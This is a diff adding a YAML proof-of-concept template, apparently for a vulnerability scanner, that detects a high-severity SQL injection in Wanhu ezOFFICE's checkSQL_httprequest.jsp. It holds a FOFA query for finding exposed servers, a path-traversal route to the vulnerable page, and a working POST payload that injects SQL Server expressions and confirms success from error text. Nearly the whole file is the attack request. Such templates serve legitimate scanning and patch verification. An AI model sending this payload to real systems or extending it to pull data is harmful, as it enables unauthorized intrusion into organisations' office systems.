@@ -1,0 +1,23 @@
+id: poc-yaml-whir-ezoffice-checksql-httprequest-jsp-sqli
+info:
+  name: 万户 ezOFFICE checkSQL_httprequest.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /
+  expression: status_code == 302 && contains(headers,"/defaultroot")
+- method: POST
+  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: selectSQL=select distinct convert(int,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--
+  expression: status_code == 200 && contains(body,"SQL ERROR") && contains(body,"0x"
+    + t2) && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值") && !contains(body,"<")
+transport: http
